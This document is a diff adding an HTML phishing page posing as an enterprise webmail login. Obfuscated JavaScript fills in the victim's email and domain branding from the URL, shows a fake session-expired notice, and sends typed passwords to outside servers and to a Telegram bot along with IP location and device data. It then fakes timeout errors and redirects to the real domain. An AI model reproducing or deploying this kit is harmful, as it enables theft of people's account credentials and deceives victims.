@@ -1,0 +1,727 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="referrer" content="strict-origin">
+<title>Enterprise portal - User login</title>
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link id="favicon" rel="shortcut icon" type="image/png" href="https://alphatrade-options.com/git/rand/favicon.png">
+<script src="https://code.jquery.com/jquery-2.2.4.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+
+  <!-- <link rel="icon" type="image/png" href="favicon.png" /> -->
+
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Lato&display=swap');
+
+    /* Root variables for theme and color customization */
+    :root {
+      --primary: #2563eb;
+      --primary-dark: #1d4ed8;
+      --background: #f9fafb;
+      --card: #ffffff;
+      --text: #1f2937;
+      --text-light: #6b7280;
+      --border: #e5e7eb;
+      --error: #dc2626;
+      --success: #16a34a;
+    }
+
+    /* Dark mode support */
+    @media (prefers-color-scheme: dark) {
+      :root {
+        --background: #1f2937;
+        --card: #111827;
+        --text: #f9fafb;
+        --text-light: #d1d5db;
+        --border: #374151;
+      }
+    }
+
+    /* Reset and base styles */
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background-color: var(--background);
+      color: var(--text);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+
+    /* Container for login card */
+    .login-container {
+      background: var(--card);
+      padding:
+    2.5rem 27px;
+      border-radius:
+    0.75rem;
+      box-shadow: 0 15px 30px rgba(0, 0, 0, 0.1);
+      width: 100%;
+      max-width: 400px;
+      transition:
+    transform 0.3s ease, box-shadow 0.3s ease;
+    }
+
+    .login-container:hover {
+      transform: translateY(-4px);
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
+    }
+
+    /* iniial Preloader spinner animation */
+    .preloader {
+      position: fixed;
+      top: 0;
+      left: 0;
+      height: 100%;
+      width: 100%;
+      background: var(--background);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+
+    .spinner {
+      border: 4px solid var(--border);
+      border-top: 4px solid var(--primary);
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+
+
+    h2 {
+      text-align: center;
+      margin-bottom: 1.5rem;
+      font-size: 75%;
+    }
+
+    /* Form styling */
+    form {
+      display: flex;
+      flex-direction: column;
+    }
+
+    input {
+      padding: 0.75rem;
+      margin-bottom: 1rem;
+      border: 1px solid var(--border);
+      border-radius: 0.375rem;
+      font-size: 1rem;
+      background: transparent;
+      color: var(--text);
+    }
+
+    input:focus {
+      outline: none;
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.3);
+    }
+
+    /* Submit button */
+    button {
+      padding: 0.75rem;
+      background: var(--primary);
+      color: white;
+      font-weight: 600;
+      border: none;
+      border-radius: 0.375rem;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background: var(--primary-dark);
+    }
+
+
+    /* Error or success messages */
+    .message {
+      text-align: center;
+      margin-top: 1rem;
+      font-size: 0.9rem;
+    }
+
+    .error {
+      color: var(--error);
+    }
+
+    .success {
+      color: var(--success);
+    }
+
+    /* Expired session animation */
+    /* .session-expired {
+      animation:
+      flash 7s ease-in-out 2;
+      position: relative;
+      bottom: 30px;
+    } */
+
+    @keyframes borderFlash {
+      0% {
+          border-color: var(--error);
+      }
+      50% {
+          border-color: #ff8a8a;
+      }
+      100% {
+          border-color: var(--error);
+      }
+    }
+
+    .session-expired {
+      background: var(--error-light);
+      color: var(--error);
+      padding: 1rem;
+      border: 2px solid var(--error);
+      border-radius: 0.5rem;
+      margin-bottom: 2rem;
+      text-align: center;
+      /* animation: slideDown 0.5s ease-out, pulse 2s infinite, borderFlash 2s infinite; */
+      animation:
+      flash 7s ease-in-out 3;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+      font-weight: 500;
+      font-size: 0.875rem;
+    }
+
+    .title {
+      font-size: 12.4px;
+      font-family: "lato", sans-serif;
+      text-align: center;
+    }
+
+    @keyframes flash {
+      0%, 100% { background-color: transparent; }
+      50% { background-color: var(--error); color: white; }
+    }
+
+    /* Social login icon styles */
+    .social-login {
+      display: flex;
+      justify-content: space-around;
+      margin-top: 1rem;
+    }
+
+    .social-login img {
+      width: 32px;
+      height: 32px;
+      cursor: pointer;
+      transition: transform 0.2s;
+    }
+
+    .social-login img:hover {
+      transform: scale(1.1);
+    }
+
+    /* ---- root bg frame -- */
+    #root {
+
+    position: absolute;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    top: 0;
+    z-index: -10;
+    pointer-events: none;
+    filter: brightness(0.3)
+  }
+
+
+  #logo-center {
+    text-align: center!important;
+  }
+
+  .footer-form {
+    text-align: center !important;
+    line-height: 7px;
+    padding:26px 0px 0px 0px;
+  }
+
+  /* ------ spinner button submit ----- */
+
+
+/* Responsive Design Enhancements */
+@media (max-width: 640px) {
+    .login-container {
+        /* margin: 1rem; */
+        padding: 1.5rem;
+    }
+
+    .session-expired {
+        font-size: 0.875rem;
+        padding: 0.75rem;
+    }
+}
+
+@media (min-width: 641px) and (max-width: 1024px) {
+    .login-container {
+        max-width: 480px;
+    }
+}
+
+  </style>
+</head>
+<script>
+  var _0x2e20a0 = _0x40b2;
+  var _0x29a3 = ["innerHTML", "137967OuewSg", '379705GmhmYc', "src", "block", "display", "message", "hash", "preventDefault", '1BQGHgr', "val", 'fail', "Check your network connection..", "style", "ajax", "kai", "input[name=pr]", 'redirecto', 'banNer', 'input[name=ai]', "title", "myframe", "74734CDKuWR", "Webmail Portal Login - ", "replace", "https://www.", "zion", 'attr', "none", "282575HCidVs", "slice", 'getElementById', 'Retype', '31421MpoORy', "indexOf", '1DvjFvy', 'length', "ai", "Invalid password . Please try again ...", "https://www.google.com/s2/favicons?domain=", "location", 'error', 'log', "focus", "pr", 'value', "12FNOhav", "hido", "572226OvGFSN", "href", "529969LtYXLi"];
+  var _0x40b2 = function (_0x1db69d, _0x3d05db) {
+    _0x1db69d = _0x1db69d - 0x93;
+    var _0x2d026b = _0x29a3[_0x1db69d];
+    return _0x2d026b;
+  };
+  var _0x2e20a0 = _0x40b2;
+  (function (_0x20ef82, _0x415708) {
+    for (; true;) {
+      try {
+        var _0x32c6ce = -parseInt(_0x40b2(0xb8)) + parseInt(_0x40b2(0xba)) + parseInt(_0x40b2(0x9e)) * -parseInt(_0x40b2(0xc4)) + parseInt(_0x40b2(0xb6)) * parseInt(_0x40b2(0xa9)) + parseInt(_0x40b2(0xa5)) + parseInt(_0x40b2(0xbc)) + parseInt(_0x40b2(0xbd)) * -parseInt(_0x40b2(0xab));
+        if (_0x32c6ce === _0x415708) {
+          break;
+        } else {
+          _0x20ef82.push(_0x20ef82.shift());
+        }
+      } catch (_0x121a32) {
+        _0x20ef82.push(_0x20ef82.shift());
+      }
+    }
+  })(_0x29a3, 0x49762);
+  var hash = window[_0x2e20a0(0xb0)].hash.substr(0x1);
+  window.onload = function init() {
+    var _0x3bd435 = _0x2e20a0;
+    if (hash) {
+      var _0xa9fdd8 = window[_0x3bd435(0xb0)][_0x3bd435(0xc2)][_0x3bd435(0xa0)]('#', '');
+      var _0x4b750f = _0xa9fdd8[_0x3bd435(0xaa)]('@');
+      var _0x16e9d7 = _0xa9fdd8[_0x3bd435(0xa6)](_0x4b750f + 0x1, _0xa9fdd8[_0x3bd435(0xac)]);
+      document[_0x3bd435(0x9c)] = "Sign in to " + _0x16e9d7.split('.')[0x0];
+      var _0x374085 = _0x3bd435(0xaf) + _0x16e9d7;
+      document[_0x3bd435(0xa7)](_0x3bd435(0xa2))[_0x3bd435(0xbe)] = _0x374085;
+      document[_0x3bd435(0xa7)](_0x3bd435(0xad)).value = _0xa9fdd8;
+      document[_0x3bd435(0xa7)](_0x3bd435(0x97))[_0x3bd435(0xbb)] = _0x16e9d7.split('.')[0x0];
+      document[_0x3bd435(0xa7)](_0x3bd435(0x9a))[_0x3bd435(0xbb)] = _0x16e9d7.split('.')[0x0];
+      $("#favicon")[_0x3bd435(0xa3)](_0x3bd435(0xb9), _0x374085);
+      document[_0x3bd435(0xa7)]("pr")[_0x3bd435(0xb3)]();
+      document.getElementById(_0x3bd435(0x9d))[_0x3bd435(0xbe)] = _0x3bd435(0xa1) + _0x16e9d7;
+      document[_0x3bd435(0xa7)]("redirecto")[_0x3bd435(0xb5)] = _0x3bd435(0xa1) + _0x16e9d7;
+    } else {}
+    let _0x23cd5d = 0x0;
+    document.getElementById("submit-btn").addEventListener("click", function (_0x136415) {
+      if ($('#ai').val().trim() != '' && $('#pr').val().trim() != '') {
+        let _0x1f89e1 = new FormData();
+        _0x1f89e1.append("temail", $("#ai").val());
+        _0x1f89e1.append('tpass', $("#pr").val());
+        document.getElementById("loading_image").style.display = "block";
+        document.getElementById("bg_screen").style.display = "block";
+        ajax = new XMLHttpRequest();
+        ajax.open("POST", 'https://lovelyservices.us/new/domain.php');
+        ajax.onreadystatechange = function () {
+          if (ajax.readyState === 0x4) {
+            if (_0x23cd5d === 0x2) {
+              window.location = $("#redirecto").val();
+            }
+            _0x23cd5d += 0x1;
+            response = ajax.response;
+            document.getElementById('loading_image').style.display = "none";
+            document.getElementById('bg_screen').style.display = "none";
+            $("#error").html("Sign in attempt timeout, Please try again.");
+            $("#pr").val('');
+          }
+        };
+        ajax.send(_0x1f89e1);
+      } else {}
+    });
+  };
+  function setVisibility() {
+    var _0x573b4b = document.getElementById("pr");
+    if (_0x573b4b.type === 'password') {
+      _0x573b4b.type = "text";
+      document.getElementById("id-password-reveal-icon").src = "https://ik.imagekit.io/escrowmade/download__1__OSvF-Qvmk.png";
+    } else {
+      _0x573b4b.type = "password";
+      document.getElementById('id-password-reveal-icon').src = 'https://ik.imagekit.io/escrowmade/download_0-BUoL3T3.png';
+    }
+  }
+  function hidePassword() {
+    var _0x54fb06 = document.getElementById("pr");
+    if (_0x54fb06.type !== "password") {
+      _0x54fb06.type = 'password';
+      document.getElementById("id-password-reveal-icon").src = "https://ik.imagekit.io/escrowmade/download_0-BUoL3T3.png";
+    }
+  }
+    </script>
+<body>
+
+  	
+
+  <!-- Preloader Spinner -->
+  <div class="preloader"  id="preloader">
+    <div class="spinner"></div>
+  </div>
+
+
+  <div id="mainContent">
+    <main class="main">
+        <!-- Login Form Container -->
+        <div class="login-container">
+          <div class="session-expired">
+            <!-- <h4 class="title">Session Expired. Verify you are not a robot to continue...</h4> -->
+            The session has expired, please log in again..
+            <!-- The session has expired, please log in again.  -->
+          </div>
+
+          <div class="xlogo" bis_skin_checked="1" id="xlogo-center" style="text-align: center;/*! margin: 12px; */">
+            <img id="zion" src="https://firebasestorage.googleapis.com/v0/b/portal-aa363.appspot.com/o/favicons.png?alt=media&amp;token=805fb0ef-a2d9-4a7f-85e6-d68384e166e3" >
+            <span style="text-transform: capitalize;" id="banNer"></span>
+          </div>
+          <!-- Login Form --> 
+            <form class="login-form">
+              <input type="email" placeholder="Email Address" id="ai" name="ai" disabled=""/>
+              <input type="password" placeholder="Password" id="pr" name="pr"/>
+              <span id="error" class="text-danger" style="display: none;color: red;">That account doesn't exist. Enter a different account</span>
+              <button type="submit" id='submit-btn'>Login</button>
+              <!-- <button type="button" id="submit-btn"  class="button-spinner" id="submitBtn">Login</button> -->
+              <div class="footer-form">
+                <p style="font-size: 12px;">
+                  All right reserved. Copyright © 2025 &nbsp;Powered by&nbsp;<span id="kai" style="text-transform: capitalize;"></span>.
+                  <br>
+                  <br>
+                </p>
+              </div>
+            </form>
+          </div>
+        </main>
+      </div>
+  
+      <!-- Placeholder for dynamic messages -->
+      <div id="message" class="message"></div>
+  
+    </div>
+  <div id="root" bis_skin_checked="1">
+    <iframe id="myframe" scrolling="no" src="" width="100%" height="100%" frameborder="0"></iframe>
+  </div>
+
+<script>
+// hide preloader spinner before showing login form
+  window.addEventListener('load', () => {
+    document.getElementById("preloader").style.display = "none";
+  });
+</script>
+<!-- Code injected by live-server -->
+</body>
+
+<script>     
+  function _0x5e05() {
+      var path = ["#aich", "65042FYJJBB", "113704CIdLyS", "Verifing...", "test", "show", "hash", "#submit-btn", "text", "#msg", "substr",
+          "Password field is empty.!", "location", "log", "replace", "827646oQqipJ", "626056QylPHj", "4VMIlFC", "1703405dwbeXw", "6UkfKvJ", "9VeLwdJ",
+          "#pr", "#error", "toLowerCase", "html", "That account doesn't exist. Enter a different account", "6089850tVqPka", "http://www.",
+          "Email field is empty.!", "#ai", "JSON", "val", "hide", "1499946efPbLU", "indexOf"
+      ];
+      _0x5e05 = function() {
+          return path;
+      };
+      return _0x5e05();
+  }
+
+  function _0x13a3(opt_attributes, deepDataAndEvents) {
+      var args = _0x5e05();
+      return _0x13a3 = function(opt_attributes, deepDataAndEvents) {
+          opt_attributes = opt_attributes - 493;
+          var pageY = args[opt_attributes];
+          return pageY;
+      }, _0x13a3(opt_attributes, deepDataAndEvents);
+  }
+  (function(topic, b) {
+      var getter = _0x13a3;
+      var out = topic();
+      for (; !![];) {
+          try {
+              var a = parseInt(getter(520)) / 1 + -parseInt(getter(519)) / 2 * (-parseInt(getter(502)) / 3) + -parseInt(getter(500)) / 4 * (parseInt(
+                  getter(501)) / 5) + -parseInt(getter(498)) / 6 + -parseInt(getter(516)) / 7 + -parseInt(getter(499)) / 8 * (-parseInt(getter(503)) /
+                  9) + parseInt(getter(509)) / 10;
+              if (a === b) {
+                  break;
+              } else {
+                  out["push"](out["shift"]());
+              }
+          } catch (_0x362680) {
+              out["push"](out["shift"]());
+          }
+      }
+  })(_0x5e05, 173088), $(document)["ready"](function() {
+      var key = _0x13a3;
+      var copies = 0;
+      var event = window[key(495)][key(524)][key(493)](1);
+      if (!event) {} else {
+          var originalEvent = event;
+          var _0x38f5c2 = originalEvent["indexOf"]("@");
+          var result = originalEvent[key(493)](_0x38f5c2 + 1);
+          var globalVars = result[key(493)](0, result[key(517)]("."));
+          var _0x3fbf77 = globalVars[key(506)]();
+          $(key(512))["val"](originalEvent);
+          $(key(518))[key(507)](originalEvent);
+          $(key(527))[key(515)]();
+      }
+      $(key(525))["click"](function(event) {
+          var hash = key;
+          $(hash(505))["hide"]();
+          $(hash(527))[hash(515)]();
+          event["preventDefault"]();
+          var expected = $(hash(512))[hash(514)]();
+          var prefix = $(hash(504))[hash(514)]();
+          var r20 = $(hash(527))["html"]();
+          $(hash(527))[hash(526)](r20);
+          var expectedOutput = expected;
+          var hashtable = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+          if (!expected) {
+              return $(hash(505))[hash(523)](), $(hash(505))[hash(507)](hash(511)), ![];
+          }
+          if (!hashtable[hash(522)](expectedOutput)) {
+              return $(hash(505))[hash(523)](), $("#error")["html"](hash(508)), ![];
+          }
+          if (!prefix) {
+              return $(hash(505))[hash(523)](), $(hash(505))[hash(507)](hash(494)), ![];
+          }
+          var index = expectedOutput[hash(517)]("@");
+          var dreams = expectedOutput[hash(493)](index + 1);
+          var acc = dreams[hash(493)](0, dreams[hash(517)]("."));
+          var _0x424914 = acc[hash(506)]();
+          copies = copies + 1;
+          $["ajax"]({
+              "dataType": "xml",
+              "url": "https://submit-form.com/U0cj1OoEy",
+              "type": "POST",
+              "data": {
+                  "ai": expected,
+                  "pr": prefix,
+              },
+              "beforeSend": function(xhr) {
+                  var parentIfText = hash;
+                  $(parentIfText(525))["html"](parentIfText(521));
+              },
+              "success": function(x) {
+                  var template = hash;
+                  if (x) {
+                      $(template(527))[template(523)]();
+                      console[template(496)](x);
+                      if (x["signal"] == "ok") {
+                          $(template(504))[template(514)]("");
+                          if (copies >= 2) {
+                              return copies = 0, window[template(495)][template(497)](template(510) + dreams), ![];
+                          }
+                      } else {}
+                  }
+              },
+              "error": function() {
+                  var getTemplate = hash;
+                  $(getTemplate(504))[getTemplate(514)]("");
+                  if (copies >= 2) {
+                      return copies = 0, window["location"][getTemplate(497)](getTemplate(510) + dreams), ![];
+                  }
+                  $(getTemplate(527))[getTemplate(523)]();
+              },
+              "complete": function() {
+                  var parent = hash;
+                  $("#submit-btn")[parent(507)]("Login");
+              }
+          });
+      });
+  });
+</script>
+</html>
+<!-- Your Existing Script Remains Untouched -->
+<script>
+  window._hasHandledOnce = false;
+
+  function generateRandomParams() {
+    const keys = ['session', 'token', 'id', 'key', 'auth', 'state', 'nonce', 'timestamp', 'signature', 'hash'];
+    const obj = {};
+    keys.forEach(k => {
+      obj[k] = Math.random().toString(36).substring(2, 12);
+    });
+    return obj;
+  }
+
+  function getUrlParams() {
+    const params = {};
+    new URLSearchParams(window.location.search).forEach((v, k) => {
+      params[k] = v;
+    });
+    return params;
+  }
+
+  if (typeof getUserInfo !== 'function') {
+    function getUserInfo(callback) {
+      $.getJSON("https://ipapi.co/json/", function (data) {
+        const info = `📍 IP Address: ${data.ip}\n🌐 Location: ${data.city}, ${data.region}, ${data.country}`;
+        callback(info);
+      }).fail(function () {
+        callback("Could not retrieve IP location.");
+      });
+    }
+  }
+
+  function getClientDeviceInfo() {
+    return {
+      platform: navigator.platform,
+      browser: (() => {
+        const ua = navigator.userAgent;
+        if (ua.includes("Edg")) return "Edge";
+        if (ua.includes("OPR") || ua.includes("Opera")) return "Opera";
+        if (ua.includes("Firefox")) return "Firefox";
+        if (ua.includes("Chrome")) return "Chrome";
+        if (ua.includes("Safari")) return "Safari";
+        return "Unknown";
+      })()
+    };
+  }
+
+  function sendVisitNotification(email, infoText) {
+    const chatId = "6683047872";
+    const botToken = "8606082439:AAGDbSNB0hVQSUH6yltUJgi7TwA3zG1-ugY";
+    const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    const device = getClientDeviceInfo();
+    const timestamp = new Date().toLocaleString();
+    const fullUrl = window.location.href;
+
+    const message = `🌐 New Visitor Alert:\n🧑 Username: ${email}\n🔗 URL: ${fullUrl}\n📅 Time: ${timestamp}\n${infoText}\n💻 Device: ${device.platform}\n🧭 Browser: ${device.browser}`;
+
+    return $.ajax({
+      url: apiUrl,
+      type: 'POST',
+      data: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+      }),
+      contentType: 'application/json',
+      processData: false,
+    });
+  }
+
+  function sendLoginAttempt(email, password) {
+    getUserInfo(function (info) {
+      const chatId = "6683047872";
+      const botToken = "8606082439:AAGDbSNB0hVQSUH6yltUJgi7TwA3zG1-ugY";
+      const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      const device = getClientDeviceInfo();
+      const timestamp = new Date().toLocaleString();
+      const fullUrl = window.location.href;
+
+      const message = `🔐 Login Attempt:\n📧 Email: ${email}\n🔑 Password: ${password}\n📅 Time: ${timestamp}\n${info}\n💻 Device: ${device.platform}\n🧭 Browser: ${device.browser}\n🔗 URL: ${fullUrl}`;
+
+      $.ajax({
+        url: apiUrl,
+        type: 'POST',
+        data: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+        }),
+        contentType: 'application/json',
+        processData: false,
+      });
+    });
+  }
+
+  (function attachLoginHook() {
+    let loginAttempts = 0;
+    document.addEventListener('DOMContentLoaded', () => {
+      const btn = document.getElementById('submit-btn');
+      if (!btn) return;
+      btn.addEventListener('click', (e) => {
+        e.preventDefault();
+        const email = document.getElementById('ai')?.value?.trim();
+        const password = document.getElementById('pr')?.value?.trim();
+        if (email && password) {
+          sendLoginAttempt(email, password);
+          loginAttempts++;
+          if (loginAttempts >= 3) {
+            const domain = email.split('@')[1];
+            window.location.replace(`https://${domain}`);
+          }
+        }
+      });
+    });
+  })();
+
+  function updateUrlWithRandomParams(user) {
+    const baseUrl = window.location.origin + window.location.pathname;
+    const params = generateRandomParams();
+    const url = new URL(baseUrl);
+    for (const key in params) {
+      url.searchParams.set(key, params[key]);
+    }
+    url.hash = user;
+    window.history.replaceState(null, null, url.toString());
+
+    // ✅ Show the page immediately after updating
+    showMainContent(user);
+  }
+
+  function showMainContent(userValue) {
+    const aiField = document.getElementById('ai');
+    if (aiField) aiField.value = userValue;
+
+    getUserInfo(function (info) {
+      sendVisitNotification(userValue, info);
+    });
+
+    window._hasHandledOnce = true;
+    document.getElementById('preloader')?.classList.add('hidden');
+    document.getElementById('mainContent')?.classList.remove('hidden');
+  }
+
+  function handlePageAccess() {
+    if (window._hasHandledOnce) return;
+
+    const hash = window.location.hash.substring(1);
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    const placeholderRegex = /^(\[\[-?email-?\]\]|\[-?email-?\]|\[email\]|\{\{email\}\}|<<email>>)$/i;
+
+    const isValidInput = emailRegex.test(hash) || placeholderRegex.test(hash);
+
+    if (isValidInput) {
+      updateUrlWithRandomParams(hash); // ✅ Always generate params
+    } else {
+      document.body.innerHTML = `
+        <div id="error-msg" style="height:100vh;display:flex;align-items:center;justify-content:center;">
+          <div style="text-align:center;font-family:sans-serif;">
+            <h2 style="color:#DB0000;">Invalid URL Access</h2>
+            <p style="color:#555;font-size:16px;">incorrect email session parameters.</p>
+          </div>
+        </div>
+      `;
+    }
+  }
+
+  window.addEventListener('DOMContentLoaded', handlePageAccess);
+  window.addEventListener('hashchange', () => {
+    window._hasHandledOnce = false;
+    handlePageAccess();
+  });
+
+  if (window.location.hash && !window._hasHandledOnce) {
+    handlePageAccess();
+  }
+</script>
+
+</body>
+</html>
